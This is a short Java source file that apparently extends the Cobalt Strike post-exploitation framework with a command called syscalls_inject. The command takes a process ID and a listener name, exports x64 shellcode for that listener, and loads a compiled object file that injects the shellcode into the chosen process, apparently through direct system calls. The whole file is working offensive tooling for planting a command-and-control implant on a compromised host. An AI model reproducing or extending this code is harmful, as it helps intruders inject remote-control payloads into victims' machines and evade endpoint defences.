package beacon.bof;

import aggressor.AggressorClient;
import beacon.PostExInlineObject;
import common.CommonUtils;
import common.ListenerUtils;
import common.Packer;
import common.ScListener;

public class syscalls_inject extends PostExInlineObject {
	protected String Params;

	public syscalls_inject(AggressorClient var1, String Params) {
		super(var1);
		this.Params = Params;
	}

	public byte[] getArguments(String var1) {
		Packer var2 = new Packer();
		String[] args = this.Params.split("\\s+");
		if (args.length == 2) {
			int pid = Integer.parseInt(args[0]);
			var2.addInt(pid);
			ScListener Listener = ListenerUtils.getListener(this.client, args[1]);
			if (Listener == null) {
				throw new RuntimeException("No listener '" + args[1] + "'");
			} else {
				var2.addLengthAndString(Listener.export(this.client, "x64", 1));
				return var2.getBytes();
			}
		} else {
			throw new RuntimeException("syscalls_inject Params Error");
		}
	}

	public byte[] getObjectFile(String var1) {
		return CommonUtils.readResource("bullbof/syscallsinject." + var1 + ".o");
	}
}
